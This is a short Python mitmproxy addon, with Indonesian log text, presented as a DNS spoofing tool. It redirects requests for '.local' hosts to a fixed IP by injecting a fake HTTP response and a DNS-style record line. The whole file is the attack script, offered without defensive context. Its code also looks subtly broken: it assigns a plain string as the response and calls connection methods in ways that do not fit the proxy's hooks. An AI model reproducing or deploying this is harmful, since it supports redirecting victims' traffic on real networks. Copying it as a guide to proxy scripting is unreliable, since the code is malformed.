from mitmproxy import ctx


def dns_spoof(flow):
    target_domain = flow.request.host
    spoofed_ip = "142.250.185.142"
    ctx.log.info(f"DNS Spoofing: {target_domain} => {spoofed_ip}")
    flow.response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
    flow.client_conn.send_data(f"{target_domain} A {spoofed_ip}\n")

def response(flow):
    if flow.request.host.endswith(".local"):
        dns_spoof(flow)

def load(load):
    ctx.log.info("DNS Spoofing aktif")
